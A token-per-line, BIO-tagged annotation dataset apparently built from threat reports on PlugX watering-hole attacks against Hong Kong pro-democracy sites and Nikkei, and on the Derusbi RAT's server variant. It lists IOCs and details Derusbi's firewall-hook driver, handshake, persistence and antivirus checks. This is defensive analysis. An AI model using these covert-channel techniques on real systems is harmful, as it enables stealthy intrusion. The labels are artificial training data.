64-bit	O
version	O
of	O
malware	O
,	O
which	O
beacons	O
to	O
58.64.178.77:443	O
.	O
At	O
the	O
time	O
of	O
this	O
writing	O
,	O
the	B-Entity
People	I-Entity
Power	I-Entity
website	I-Entity
is	O
still	O
serving	B-Action
up	I-Action
malicious	O
code	O
.	O
Volexity	O
recommends	O
avoiding	O
this	O
website	O
and/or	O
browsing	O
with	O
caution	O
.	O
Volexity	O
believes	O
a	O
separate	O
group	O
of	O
attackers	O
is	O
responsible	O
for	O
this	O
exploit	O
activity	O
and	O
that	O
they	O
are	O
not	O
affiliated	O
with	O
the	O
java-se.com	O
operations	O
.	O
While	O
digging	O
deeper	O
into	O
pro	O
-	O
democratic	O
websites	O
in	O
Hong	O
Kong	O
,	O
Volexity	O
also	O
discovered	O
peculiar	O
code	O
on	O
the	O
website	O
of	O
a	O
pro-	O
democratic	O
and	O
pro	O
-	O
universal	O
suffrage	O
public	O
policy	O
think	O
thank	O
The	O
Professional	O
Commons	O
(	O
www.procommons.org.hk	O
)	O
.	O
In	O
the	O
case	O
of	O
this	O
website	O
,	O
there	O
is	O
suspicious	O
JavaScript	O
code	O
that	O
writes	O
an	O
iFrame	O
pointing	O
back	O
to	O
a	O
non	O
-	O
existent	O
HTML	O
page	O
on	O
a	O
hotel	O
website	O
in	O
South	O
Korea	O
.	O
The	O
code	O
from	O
the	O
website	O
can	O
be	O
seen	O
in	O
the	O
screen	O
shot	O
below	O
.	O
The	O
URL	O
in	O
question	O
points	O
to	O
.	O
hXXp://www.hotel365.co.kr	O
/	O
Lnk	O
/	O
tw	O
/	O
index.html	O
This	O
link	O
does	O
not	O
work	O
and	O
will	O
redirect	O
a	O
visitor	O
back	O
to	O
the	O
main	O
page	O
of	O
the	O
website	O
.	O
There	O
does	O
not	O
appear	O
to	O
be	O
any	O
reason	O
for	O
the	O
Professional	O
Commmons	O
website	O
to	O
have	O
a	O
hidden	O
iFrame	O
link	O
randomly	O
placed	O
in	O
the	O
middle	O
of	O
its	O
HTML	O
code	O
.	O
It	O
is	O
suspected	O
that	O
this	O
was	O
a	O
formerly	O
active	O
exploit	O
URL	O
.	O
If	O
it	O
is	O
actually	O
malicious	O
,	O
it	O
is	O
possible	O
the	O
code	O
could	O
be	O
re	O
-	O
activated	O
at	O
any	O
time	O
.	O
Volexity	O
recommend	O
the	O
URL	O
and	O
the	O
Professional	O
Commons	O
website	O
be	O
browsed	O
with	O
caution	O
.	O
In	O
early	O
September	O
,	O
the	O
APT	O
group	O
behind	O
java-se.com	O
raised	O
its	O
visibility	O
on	O
Volexity	O
€	O
™s	O
radar	O
following	O
a	O
compromise	O
that	O
effectively	O
impacted	O
many	O
components	O
of	O
the	O
Japanese	O
Nikkei	O
.	O
In	O
the	O
first	O
week	O
of	O
September	O
,	O
a	O
subdomain	O
used	O
to	O
load	O
JavaScript	O
code	O
and	O
additional	O
files	O
onto	O
other	O
Nikkei	O
web	O
properties	O
such	O
as	O
www.nikkei.com	O
and	O
asia.nikkei.com	O
was	O
compromised	O
.	O
In	O
particular	O
a	O
JavaScript	O
file	O
loaded	O
from	O
parts.nikkei.com	O
was	O
modified	O
to	O
reference	O
another	O
JavaScript	O
file	O
from	O
jre76.java-se.com	O
hosted	O
on	O
the	O
Japanese	O
IP	O
address	O
211.125.81.203	O
.	O
7506	O
|	O
211.125.80.0/22	O
|	O
INTERQ	O
|	O
JP	O
|	O
GMO.JP	O
|	O
GMO	O
INTERNET	O
INC	O
.	O
The	O
code	O
has	O
since	O
been	O
taken	O
down	O
.	O
However	O
,	O
in	O
early	O
September	O
the	O
JavaScript	O
was	O
pre	O
-	O
pended	O
to	O
the	O
file	O
http://parts.nikkei.com/parts/SC/s_cDS.js	O
as	O
seen	O
in	O
the	O
screen	O
shot	O
below	O
.	O
Like	O
the	O
JavaScript	O
from	O
the	O
ATD	O
and	O
DPHK	O
websites	O
,	O
Volexity	O
was	O
never	O
actually	O
able	O
to	O
obtain	O
a	O
live	O
copy	O
of	O
this	O
script	O
.	O
Each	O
request	O
results	O
in	O
an	O
HTTP	O
403	O
response	O
from	O
the	O
server	O
.	O
Volexity	O
suspects	O
the	O
code	O
was	O
either	O
active	O
at	O
select	O
times	O
and/or	O
was	O
only	O
served	O
to	O
a	O
subset	O
of	O
visitors	O
.	O
The	O
code	O
has	O
not	O
been	O
observed	O
on	O
the	O
s_cDS.js	O
file	O
for	O
nearly	O
a	O
month	O
now	O
.	O
While	O
tracking	O
this	O
APT	O
activity	O
,	O
Volexity	O
has	O
also	O
come	O
across	O
other	O
seemingly	O
unrelated	O
compromises	O
of	O
websites	O
in	O
Hong	O
Kong	O
and	O
Japan	O
associated	O
with	O
the	O
java-se.com	O
activity	O
.	O
Despite	O
several	O
sites	O
being	O
compromised	O
,	O
the	O
above	O
activity	O
tied	O
to	O
java-se.com	O
did	O
not	O
result	O
in	O
the	O
successful	O
capture	O
of	O
actual	O
exploit	O
code	O
or	O
malware	O
.	O
However	O
,	O
research	O
into	O
other	O
websites	O
and	O
activity	O
involving	O
java-se.com	O
did	O
lead	O
Volexity	O
to	O
live	O
exploits	O
and	O
malware	O
.	O
In	O
particular	O
Volexity	O
came	O
across	O
live	O
exploit	O
code	O
hosted	O
at	O
jdk-7u12-windows-i586.java-se.com	O
on	O
the	O
Japanese	O
IP	O
address	O
210.253.96.200	O
.	O
7506	O
|	O
210.253.96.0/20	O
|	O
INTERQ	O
|	O
JP	O
|	O
GMO.JP	O
|	O
GMO	O
INTERNET	O
INC	O
.	O
This	O
system	O
hosted	O
a	B-Entity
JavaScript	I-Entity
file	I-Entity
,	O
which	O
in	O
turned	O
loads	O
a	B-Action
malicious	B-Entity
Java	I-Entity
Applet	I-Entity
.	O
In	O
testing	O
the	O
the	O
Java	O
Applet	O
pops	O
up	O
a	O
notification	O
to	O
the	O
user	O
asking	O
them	O
if	O
they	O
want	O
to	O
run	O
the	O
applet	O
.	O
Volexity	O
has	O
not	O
had	O
enough	O
time	O
to	O
thoroughly	O
analyze	O
the	O
file	O
to	O
see	O
if	O
it	O
is	O
an	O
actual	O
exploit	O
or	O
if	O
the	O
attackers	O
rely	O
on	O
user	O
assisted	O
malware	O
installation	O
.	O
The	O
pop	O
-	O
up	O
does	O
make	O
it	O
appear	O
as	O
if	O
the	O
file	O
is	O
an	O
update	O
to	O
Java	O
.	O
The	O
popup	O
displayed	O
by	O
Java	O
is	O
displayed	O
below	O
.	O
As	O
can	O
be	O
seen	O
in	O
the	O
image	O
above	O
,	O
this	O
popup	O
could	O
be	O
misconstrued	O
by	O
a	O
user	O
as	O
an	O
update	O
to	O
Java	O
despite	O
the	O
java-se.com	O
domain	O
and	O
the	O
Publisher	O
being	O
listed	O
as	O
WindySoft	O
.	O
Interestingly	O
the	O
Java	O
Archive	O
being	O
loaded	O
is	O
digitally	O
signed	O
by	O
a	O
certificate	O
issued	O
to	O
WindySoft	O
,	O
an	O
online	O
gaming	O
company	O
from	O
South	O
Korea	O
.	O
We	O
can	O
not	O
confirm	O
this	O
certificate	O
actually	O
belonged	O
to	O
WindySoft	O
at	O
any	O
point	O
in	O
time	O
,	O
however	O
,	O
there	O
is	O
fairly	O
established	O
precedent	O
of	O
certificates	O
from	O
online	O
gaming	O
companies	O
being	O
used	O
to	O
digitally	O
sign	O
malware	O
and	O
attack	O
tools	O
.	O
As	O
one	O
might	O
expect	O
,	O
choosing	O
to	O
press	O
the	O
Run	O
button	O
would	O
be	O
bad	O
news	O
for	O
someone	O
presented	O
with	O
this	O
prompt	O
.	O
If	O
one	O
were	O
to	O
click	O
Run	O
from	O
this	O
prompt	O
,	O
it	O
would	O
result	O
in	O
the	O
file	O
css.jpg	O
being	O
download	O
over	O
an	O
encrypted	O
channel	O
from	O
a	O
folder	O
on	O
https://elsa-jp.jp	O
.	O
Note	O
that	O
elsa-jp.jp	O
is	O
a	O
website	O
hosted	O
on	O
the	O
same	O
IP	O
address	O
jdk-7u12-windows-i586.java-se.com	O
and	O
is	O
likely	O
compromised	O
.	O
The	O
file	O
css.jpg	O
is	O
of	O
course	O
not	O
a	O
JPEG	O
file	O
,	O
it	O
is	O
an	O
executable	O
that	O
has	O
been	O
encoded	O
with	O
the	O
single	O
-	O
byte	O
XOR	O
key	O
0xFF	O
.	O
Filename	O
:	O
css.jpg	O
File	O
size	O
:	O
168776	O
bytes	O
MD5	O
hash	O
:	O
b3a9e6548fb3cc511096af4d68b2e745	O
SHA1	O
hash	O
:	O
394703d1240ccd3aaeeef50c212313e3036741b1	O
Notes	O
:	O
Executable	O
file	O
downloaded	O
by	O
Java	O
Applet	O
that	O
has	O
been	O
encoded	O
with	O
XOR	O
0	O
-99	O
Taking	O
a	O
closer	O
look	O
at	O
the	O
resulting	O
executable	O
we	O
have	O
,	O
it	O
turns	O
out	O
it	O
is	O
a	O
newer	O
sample	O
of	O
PlugX.	O
In	O
this	O
particular	O
sample	O
an	O
interesting	O
and	O
notable	O
string	O
was	O
observed	O
.	O
C:\wocawocawoca\piao\Release\caca.pdb	O
Also	O
of	O
interest	O
is	O
that	O
as	O
observed	O
from	O
the	O
Java	O
Applet	O
,	O
the	O
executable	O
is	O
also	O
digitally	O
signed	O
by	O
a	O
certificate	O
issued	O
to	O
€	O
œWindySoft	O
.	O
€	O
​	O
Upon	O
execution	O
the	O
malware	O
sample	O
immediately	O
does	O
a	O
DNS	O
resolution	O
for	O
the	O
following	O
hostname	O
.	O
jduhf873jdu7.blog.163.com	O
The	B-Entity
PlugX	I-Entity
sample	I-Entity
connects	B-Action
to	B-Modifier
the	O
blog	O
and	O
parses	O
the	O
page	O
for	O
a	O
command	O
for	O
where	O
to	O
connect	O
to	O
next	O
.	O
This	O
is	O
very	O
similar	O
to	O
the	O
method	O
described	O
by	O
FireEye	O
in	O
their	O
blog	O
on	O
Operation	O
Poisoned	O
Hurricane	O
.	O
The	O
primary	O
difference	O
being	O
that	O
the	O
attackers	O
opted	O
to	O
use	O
a	O
163.com	O
Blog	O
over	O
a	O
Google	O
Code	O
page	O
to	O
embed	O
the	O
command	O
.	O
Taking	O
a	O
closer	O
look	O
at	O
the	O
Blog	O
page	O
the	O
following	O
post	O
is	O
observed	O
.	O
The	O
primary	O
string	O
to	O
focus	O
on	O
is	O
in	O
the	O
title	O
of	O
the	O
post	O
:	O
DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS	O
Using	O
the	O
same	O
decoding	O
routine	O
describe	O
by	O
Cassidian	O
in	O
a	O
PlugX	O
post	O
of	O
theirs	O
from	O
earlier	O
this	O
year	O
,	O
we	O
can	O
see	O
this	O
command	O
decodes	O
to	O
instruct	O
the	O
malware	O
to	O
connect	O
to	O
a	O
U.S	O
.-	O
based	O
Linode	O
IP	O
address	O
at	O
Hurricane	O
Electric	O
:	O
173.255.217.77	O
.	O
6939	O
|	O
173.255.208.0/20	O
|	O
HURRICANE	O
|	O
US	O
|	O
LINODE.COM	O
|	O
LINODE	O
A	O
look	O
at	O
passive	O
DNS	O
identifies	O
several	O
hostnames	O
that	O
recently	O
resolved	O
to	O
the	O
IP	O
address	O
.	O
The	O
ones	O
that	O
still	O
resolve	O
to	O
the	O
IP	O
are	O
listed	O
below	O
.	O
These	O
hostnames	O
may	O
be	O
related	O
but	O
at	O
the	O
time	O
of	O
this	O
writing	O
we	O
have	O
not	O
seen	O
them	O
in	O
use	O
in	O
malware	O
and	O
are	O
unable	O
to	O
confirm	O
.	O
As	O
we	O
have	O
seen	O
for	O
several	O
years	O
now	O
,	O
dissenting	O
groups	O
,	O
especially	O
those	O
seeking	O
increased	O
levels	O
of	O
freedom	O
frequently	O
find	O
themselves	O
targeted	O
for	O
surveillance	O
and	O
information	O
extraction	O
.	O
In	O
the	O
digital	O
age	O
,	O
a	O
strategic	O
web	O
compromise	O
(	O
exploit	O
drive	O
-	O
by	O
)	O
has	O
become	O
a	O
key	O
weapon	O
of	O
choice	O
for	O
to	O
conduct	O
such	O
operations	O
.	O
These	O
types	O
of	O
attacks	O
are	O
far	O
from	O
overt	O
,	O
as	O
a	O
typical	O
target	O
and	O
victim	O
opted	O
to	O
go	O
on	O
their	O
own	O
to	O
what	O
they	O
believe	O
should	O
be	O
a	O
safe	O
and	O
trusted	O
website	O
.	O
In	O
the	O
case	O
of	O
this	O
post	O
,	O
it	O
appears	O
that	O
at	O
least	O
two	O
different	O
attackers	O
were	O
involved	O
in	O
compromising	O
and	O
placing	O
malicious	O
code	O
on	O
Pro	O
-	B-Entity
Democratic	I-Entity
websites	I-Entity
in	I-Entity
Hong	I-Entity
Kong	I-Entity
.	O
This	O
is	O
not	O
the	O
first	O
time	O
and	O
surely	O
will	O
not	O
be	O
the	O
last	O
time	O
that	O
those	O
in	O
favor	O
of	O
democracy	O
in	O
Hong	O
Kong	O
will	O
be	O
targeted	O
.	O
Unfortunately	O
with	O
the	O
level	O
of	O
access	O
and	O
infrastructure	O
the	O
attackers	O
appear	O
to	O
have	O
,	O
this	O
is	O
quite	O
an	O
uphill	O
battle	O
.	O
Continuing	O
to	O
expose	O
these	O
attack	O
is	O
one	O
means	O
that	O
shines	O
light	O
on	O
these	O
attack	O
operations	O
with	O
an	O
aim	O
at	O
putting	O
a	O
dent	O
in	O
their	O
success	O
.	O
There	O
are	O
two	O
types	O
of	O
Derusbi	O
malware	O
:	O
a	O
client	O
-	O
server	O
model	O
and	O
a	O
server	O
-	O
client	O
model	O
.	O
Both	O
types	O
provide	O
basic	O
RAT	O
functionality	O
with	O
the	O
distinction	O
between	O
the	O
two	O
being	O
largely	O
the	O
directionality	O
of	O
the	O
communication	O
.	O
This	O
report	O
will	O
focus	O
on	O
the	O
server	O
-	O
client	O
variant	O
(	O
or	O
simply	O
,	O
the	O
"	O
server	O
variant	O
"	O
)	O
of	O
Derusbi	O
,	O
which	O
acts	O
as	O
a	O
server	O
on	O
a	O
victim	O
's	O
machine	O
and	O
waits	B-Action
for	O
commands	B-Action
from	B-Entity
a	I-Entity
controlling	I-Entity
client	I-Entity
.	O
In	O
and	O
of	O
itself	O
,	O
the	O
Derusbi	O
server	O
variant	O
is	O
a	O
largely	O
unremarkable	O
RAT	O
when	O
viewed	O
from	O
the	O
perspective	O
of	O
functional	O
capabilities	O
.	O
The	O
server	O
variant	O
supports	O
basic	O
RAT	O
functionality	O
such	O
as	O
file	O
management	O
(	O
uploading	O
and	O
downloading	B-Action
)	O
,	O
network	O
tunneling	O
and	O
remote	O
command	O
shell	O
.	O
What	O
makes	O
the	O
server	O
variant	O
interesting	O
is	O
the	B-Entity
device	I-Entity
driver	I-Entity
that	O
the	B-Entity
variant	I-Entity
installs	I-Entity
.	O
The	O
server	B-Entity
variant	I-Entity
utilizes	O
a	O
device	O
driver	O
in	O
order	O
to	O
hook	O
into	O
the	O
Windows	B-Entity
firewall	I-Entity
by	O
either	O
using	O
largely	O
undocumented	O
Windows	O
Firewall	O
hooking	O
techniques	O
found	O
in	O
Windows	O
XP	O
and	O
older	O
or	O
by	O
using	O
the	O
documented	O
Windows	O
Filtering	O
Platform	O
found	O
in	O
Windows	O
Vista	O
and	O
later	O
.	O
The	O
driver	O
,	O
after	O
hooking	O
the	O
firewall	O
using	O
either	O
of	O
the	O
two	O
mentioned	O
interfaces	O
,	O
will	O
inspect	O
incoming	O
network	O
packets	O
.	O
If	O
a	O
specific	O
handshake	O
occurs	O
between	O
the	O
client	O
and	O
the	O
server	O
variant	O
,	O
the	O
remainder	O
of	O
the	O
communication	O
session	O
for	O
the	O
established	O
session	O
will	O
be	O
redirected	O
to	O
the	O
server	O
variant	O
.	O
If	O
the	O
driver	O
does	O
not	O
detect	O
the	O
appropriate	O
handshake	O
,	O
then	O
the	O
network	O
traffic	O
is	O
allowed	O
to	O
pass	O
unobstructed	O
.	O
This	O
allows	O
an	B-Entity
attacker	I-Entity
to	B-Modifier
hide	O
their	O
communication	O
within	O
a	O
cluster	O
of	O
network	O
sessions	O
originating	O
from	O
a	O
single	O
IP	O
such	O
as	O
would	O
be	O
the	O
case	O
for	O
a	O
client	O
performing	O
multiple	O
HTTP	O
requests	O
against	O
a	O
web	O
server	O
.	O
The	O
server	O
variant	O
runs	O
as	O
a	O
svchost	O
dependent	O
service	O
.	O
While	O
the	O
server	O
variant	O
binary	O
does	O
have	O
exports	O
related	O
to	O
the	O
standard	O
service	O
DLL	O
(	O
e.g.	O
ServiceMain	O
,	O
DllRegisterService	O
,	O
etc	O
.	O
)	O
,	O
the	O
startup	O
sequence	O
truly	O
begins	O
in	O
the	O
DllEntryPoint	O
function	O
.	O
When	O
loaded	B-Action
into	B-Modifier
memory	B-Entity
via	O
a	O
LoadLibrary	B-Entity
or	I-Entity
equivalent	I-Entity
function	I-Entity
call	I-Entity
,	O
the	B-Entity
server	I-Entity
variant	I-Entity
will	O
determine	O
the	O
name	O
of	O
the	O
host	O
binary	O
(	O
presumably	O
svchost.exe	O
)	O
as	O
well	O
as	O
its	O
own	O
DLL	O
's	O
name	O
.	O
The	O
binary	O
then	O
spawns	O
a	O
new	B-Entity
thread	I-Entity
that	O
contains	O
the	O
main	O
server	O
variant	O
code	O
in	O
order	O
to	O
allow	O
the	O
DllEntryPoint	O
routine	O
to	O
return	O
to	O
the	O
calling	O
function	O
.	O
Within	O
the	O
main	O
server	O
variant	O
function	O
(	O
dubbed	O
mainThread	O
)	O
,	O
the	O
server	O
variant	B-Entity
loads	O
a	O
pointer	O
to	O
the	O
API	O
function	O
GetCommandLineW	O
,	O
locates	O
the	O
pointer	O
in	O
memory	O
to	O
the	O
command	O
line	O
string	O
,	O
and	O
then	O
locates	O
the	O
first	O
space	O
within	O
the	O
command	O
line	O
string	O
and	O
terminates	O
the	O
string	O
by	O
placing	O
a	O
NULL	O
character	O
at	O
the	O
location	O
.	O
The	O
server	B-Entity
variant	I-Entity
then	O
attempts	O
to	O
determine	B-Action
if	O
it	B-Entity
has	B-Entity
suitable	I-Entity
access	I-Entity
rights	I-Entity
within	O
the	O
system	O
in	O
order	O
to	O
operation	O
.	O
The	O
check	B-Entity
for	I-Entity
access	I-Entity
rights	I-Entity
effectively	O
checks	O
to	O
see	O
if	O
the	O
server	B-Entity
variant	I-Entity
process	I-Entity
is	I-Entity
running	I-Entity
under	I-Entity
the	I-Entity
NT	I-Entity
Authority	I-Entity
.	O
If	O
the	O
check	O
is	O
unsuccessful	O
,	O
then	O
the	O
server	O
variant	O
terminates	O
.	O
With	O
the	O
command	O
line	O
patched	O
and	O
authority	O
verified	O
,	O
the	O
server	O
variant	O
sleeps	O
for	O
5	O
seconds	O
before	O
verifying	O
that	O
the	O
fShutdown	O
flag	O
is	O
not	O
set	O
.	O
The	O
fShutdown	O
flag	O
can	O
become	O
set	O
by	O
the	O
process	O
loading	O
the	O
server	O
variant	O
calling	O
the	O
DllRegisterServer	O
export	O
.	O
The	O
DllRegisterServer	B-Entity
function	I-Entity
,	O
among	O
other	O
tasks	O
,	O
will	O
attempt	O
to	O
install	O
the	O
server	B-Entity
variant	I-Entity
as	O
a	O
server	O
on	O
the	O
victim	O
's	O
machine	O
.	O
Therefore	O
,	O
by	O
waiting	O
5	O
seconds	O
before	O
continuing	O
the	O
mainThread	O
functionality	O
,	O
the	O
server	O
variant	O
is	O
giving	O
the	O
DllRegisterServer	O
time	O
to	O
activate	O
and	O
perform	O
the	O
necessary	O
operations	O
to	O
ensure	O
that	O
the	O
server	O
variant	O
is	O
properly	O
installed	O
and	O
activated	O
as	O
a	O
service	O
.	O
The	O
mainThread	O
calls	O
the	O
mainLoop	O
function	O
of	O
the	O
server	O
variant	O
.	O
The	O
mainLoop	B-Entity
function	I-Entity
begins	O
by	O
loading	O
the	O
unique	B-Entity
infection	I-Entity
ID	I-Entity
for	O
the	O
victim	O
's	O
machine	O
from	O
the	O
registry	O
(	O
under	O
the	O
key	O
value	O
located	O
at	O
HKLM\SOFTWARE\Microsoft\Rpc\Security	O
)	O
.	O
The	O
infection	O
ID	O
,	O
if	O
present	O
,	O
must	O
be	O
decoded	O
by	O
XOR'ing	O
each	O
byte	O
of	O
the	O
string	O
with	O
a	O
static	O
byte	O
value	O
(	O
typically	O
0x5F	O
)	O
.	O
If	O
the	O
infection	O
ID	O
does	O
not	O
exist	O
within	O
the	O
registry	O
,	O
the	O
server	O
variant	O
will	O
attempt	O
to	O
load	O
the	O
configuration	O
from	O
an	O
encoded	O
buffer	O
located	O
immediately	O
after	O
the	O
static	O
string	O
XXXXXXXXXXXXXXX	O
,	O
decode	O
the	O
buffer	O
by	O
starting	O
at	O
the	O
last	O
byte	O
and	O
XORing	O
each	O
previous	O
byte	O
by	O
the	O
current	O
byte	O
value	O
in	O
reverse	O
order	O
;	O
the	O
server	O
variant	O
will	O
then	O
use	O
a	O
specific	O
portion	O
of	O
the	O
configuration	O
blob	O
as	O
the	O
infection	O
ID	O
's	O
base	O
.	O
Next	O
,	O
the	O
server	O
variant	O
will	O
append	O
a	O
hyphen	O
and	O
a	O
four	O
digit	O
value	O
to	O
the	O
end	O
of	O
the	O
infection	O
ID	O
to	O
generate	O
the	O
unique	O
infection	O
ID	O
for	O
the	O
victim	O
's	O
machine	O
.	O
The	O
newly	O
generated	O
infection	O
ID	O
is	O
then	O
saved	O
to	O
the	O
registry	O
location	O
stated	O
previously	O
.	O
The	O
mainLoop	O
attempts	O
to	O
get	O
the	O
privileges	O
for	O
SeDebugPrivilege	O
,	O
SeLoadDriverPrivilege	O
,	O
SeShutdownPrivilege	O
,	O
and	O
SeTcbPrivilege	O
in	O
order	O
to	O
perform	O
the	O
necessary	O
operations	O
to	O
load	O
the	O
driver	O
portion	O
of	O
the	O
server	O
variant	O
.	O
The	O
mainLoop	O
will	O
attempt	O
to	O
open	O
a	O
handle	O
to	O
the	O
driver	O
(	O
if	O
it	O
is	O
already	O
installed	O
)	O
by	O
calling	O
CreateFile	O
with	O
the	O
filename	O
of	O
\Device\{93144EB0	O
-	O
8E3E-4591-B307	O
-	O
8EEBFE7DB28F}.	O
Failing	O
this	O
,	O
the	O
mainLoop	O
determines	O
if	O
the	O
victim	O
's	O
machine	O
is	O
running	O
the	O
360	O
antivirus	O
product	O
by	O
looking	O
for	O
a	O
process	O
with	O
the	O
name	O
ZhuDongFangYu.exe	O
.	O
If	O
the	O
process	O
is	O
running	O
,	O
the	O
driver	O
is	O
not	O
installed	O
but	O
the	O
mainLoop	O
continues	O
regardless	O
.	O
If	O
the	O
process	O
is	O
not	O
found	O
,	O
however	O
,	O
the	O
mainLoop	O
will	O
extract	O
the	O
driver	O
binary	O
from	O
an	O
encoded	O
buffer	O
within	O
itself	O
,	O
decode	O
the	O
file	O
in	O
memory	O
(	O
using	O
a	O
rotating	O
4-byte	O
XOR	O
key	O
)	O
,	O
and	O
install	O
the	O
driver	O
on	O
the	O
victim	O
's	O
machine	O
as	O
%	O
SYSDIR%\Drivers\{93144EB0	O
-	O
8E3E-4591-B307	O
-	O
8EEBFE7DB28F}.sys	O
.	O
With	O
the	O
driver	O
present	O
(	O
or	O
recently	O
installed	O
)	O
,	O
the	O
mainLoop	O
spawns	O
another	O
thread	O
(	O
dubbed	O
DerusbiThread::DerusbiThread	O
)	O
that	O
acts	O
as	O
the	O
primary	O
communication	O
loop	O
.	O
DerusbiThread::DerusbiThread	O
begins	O
by	O
generating	O
a	O
PCC_SOCK	O
object	O
.	O
PCC_SOCK	O
is	O
an	O
abstraction	O
for	O
the	O
communication	O
subsystem	O
.	O
The	O
prototype	O
for	O
PCC_SOCK	O
appears	O
in	O
Figure	O
1	O
.	O
With	O
a	O
new	O
PCC_SOCK	O
object	O
allocates	O
,	O
DerusbiThread::DerusbiThread	B-Entity
selects	O
a	O
port	B-Entity
between	I-Entity
40,000	I-Entity
and	I-Entity
45,000	I-Entity
to	B-Modifier
use	I-Modifier
as	B-Entity
a	I-Entity
listening	I-Entity
port	I-Entity
.	O
The	O
port	O
number	O
is	O
sent	O
to	O
the	O
driver	O
(	O
via	O
IOCTL	O
0x220200	O
)	O
in	O
order	O
to	O
inform	O
the	O
driver	O
where	O
to	O
redirect	O
incoming	O
traffic	O
.	O
The	O
"	O
Windows	O
Device	O
Driver	O
(	O
Firewall	O
Hook	O
)	O
"	O
section	O
explains	O
the	O
functionality	O
of	O
the	O
driver	O
in	O
greater	O
detail	O
.	O
DerusbiThread::DerusbiThread	O
binds	O
to	O
the	O
specified	O
port	O
and	O
opens	O
the	O
port	O
as	O
a	O
listener	O
.	O
At	O
this	O
point	O
DerusbiThread::DerusbiThread	O
enters	O
an	O
infinite	O
loop	O
of	O
waiting	O
for	O
new	O
connections	O
to	O
the	O
listening	O
socket	O
and	O
dispatching	O
a	O
new	O
thread	O
(	O
dubbed	O
CommLoop	O
)	O
to	O
handle	O
the	O
traffic	O
for	O
the	O
socket	O
until	O
fShutdown	O
is	O
set	O
.	O
At	O
this	O
point	O
,	O
the	O
startup	O
sequence	O
for	O
Derusbi	O
is	O
complete	O
and	O
the	O
server	O
variant	O
moves	O
into	O
a	O
communication	O
and	O
command	O
dispatch	O
phase	O
.	O
The	O
communication	O
between	O
the	O
controlling	O
client	O
and	O
the	O
Derusbi	O
server	O
variant	O
depends	O
on	O
the	O
device	O
driver	O
being	O
in	O
place	O
.	O
The	O
authors	O
of	O
the	O
device	O
driver	O
designed	O
the	O
driver	O
to	O
work	O
on	O
Windows	O
2000	O
and	O
later	O
versions	O
of	O
the	O
Windows	O
operating	O
system	O
.	O
Depending	O
on	O
the	O
version	O
of	O
the	O
victim	O
's	O
OS	O
,	O
the	O
driver	O
will	O
hook	O
the	O
Windows	O
Firewall	O
by	O
either	O
using	O
the	O
surprisingly	O
undocumented	O
IOCTL_IP_SET_FIREWALL_HOOK	O
command	O
of	O
the	O
\\Device\IP	O
device	O
for	O
Windows	O
XP	O
or	O
older	O
machines	O
or	O
by	O
using	O
the	O
documented	O
Windows	O
Filtering	O
Platform	O
(	O
WFP	O
)	O
found	O
in	O
Windows	O
Vista	O
and	O
later	O
.	O
The	O
device	B-Entity
driver	I-Entity
inspects	B-Action
incoming	I-Action
network	B-Entity
traffic	I-Entity
from	I-Entity
any	I-Entity
client	I-Entity
connecting	I-Entity
to	I-Entity
the	I-Entity
victim	I-Entity
machine	I-Entity
,	O
determines	O
if	O
an	O
appropriate	O
handshake	O
packet	O
occurs	O
at	O
the	O
beginning	O
of	O
a	O
new	O
TCP	O
session	O
,	O
and	O
then	O
makes	O
the	O
decision	O
to	O
reroute	O
the	O
network	B-Entity
traffic	I-Entity
to	B-Modifier
the	O
Derusbi	O
malware	O
or	O
let	O
the	O
traffic	O
continue	O
unaltered	O
to	O
its	O
original	O
service	O
.	O
Once	O
a	O
session	O
has	O
been	O
established	O
by	O
means	O
of	O
a	O
valid	O
handshake	O
,	O
any	O
subsequent	O
packets	O
from	O
the	O
client	O
for	O
the	O
given	O
TCP	O
session	O
will	O
automatically	O
be	O
directed	O
by	O
the	O
device	O
driver	O
to	O
the	O
Derusbi	O
server	O
variant	O
.	O
The	O
device	O
driver	O
does	O
not	O
capture	O
or	O
store	O
any	O
network	O
traffic	O
outside	O
of	O
the	O
initial	O
handshake	O
inspection	O
.	O
The	O
Derusbi	B-Entity
server	I-Entity
variant	I-Entity
will	O
select	B-Action
an	B-Entity
available	I-Entity
,	I-Entity
random	I-Entity
port	I-Entity
between	O
the	O
range	O
of	O
40,000	O
and	O
45,000	O
on	O
the	O
victim	O
's	O
machine	O
upon	O
which	O
to	O
listen	O
.	O
After	O
selecting	O
the	O
port	O
,	O
the	O
server	O
variant	O
will	O
wait	O
for	O
incoming	O
connections	O
and	O
instruct	B-Action
the	B-Entity
driver	I-Entity
to	O
redirect	O
appropriate	O
TCP	B-Entity
sessions	I-Entity
to	B-Modifier
the	O
listening	O
port	O
.	O
In	O
order	O
to	O
establish	O
a	O
valid	O
communication	O
channel	O
between	O
the	O
server	O
variant	O
and	O
a	O
controlling	O
client	O
,	O
a	O
specific	O
handshake	O
is	O
required	O
.	O
The	O
handshake	O
between	O
a	O
client	O
and	O
the	O
server	O
variant	O
is	O
well	O
defined	O
and	O
consisting	O
of	O
64	O
bytes	O
,	O
the	O
data	O
within	O
the	O
handshake	O
is	O
entirely	O
random	O
with	O
the	O
exception	O
of	O
the	O
3rd	O
and	O
8th	O
DWORD	O
.	O
The	O
handshake	O
begins	O
when	O
the	O
client	O
sends	O
a	O
64	O
byte	O
random	O
buffer	O
with	O
the	O
3rd	O
(	O
offset	O
12	O
)	O
and	O
8th	O
(	O
offset	O
32	O
)	O
DWORDs	O
defined	O
as	O
.	O
The	O
server	O
will	O
acknowledge	O
the	O
handshake	O
by	O
sending	O
a	O
64	O
byte	O
random	O
buffer	O
with	O
the	O
same	O
pattern	O
for	O
the	O
3rd	O
and	O
8th	O
DWORDs	O
based	O
on	O
the	O
new	O
,	O
randomly	O
generated	O
1st	O
DWORD	O
(	O
offset	O
0	O
)	O
.	O
It	O
is	O
the	O
client	O
's	O
handshake	O
that	O
the	O
driver	O
for	O
the	O
server	O
variant	O
triggers	O
off	O
of	O
.	O
Some	O
older	O
versions	O
of	O
the	O
server	O
variant	O
use	O
a	O
different	O
set	O
of	O
DWORDs	O
to	O
validate	O
the	O
handshake	O
,	O
also	O
the	O
tests	O
are	O
the	O
same	O
.	O
These	O
other	O
versions	O
have	O
been	O
observed	O
to	O
use	O
the	O
following	O
DWORDs	O
.	O
If	O
the	O
handshake	O
fails	O
,	O
the	O
server	O
variant	O
provides	O
a	O
secondary	O
means	O
to	O
authenticate	O
a	O
client	O
.	O
Presumably	O
a	O
failsafe	O
if	O
the	O
driver	O
is	O
unable	O
to	O
load	O
,	O
the	O
secondary	O
method	O
requires	O
the	O
client	O
to	O
send	O
a	O
POST	O
request	O
with	O
the	O
following	O
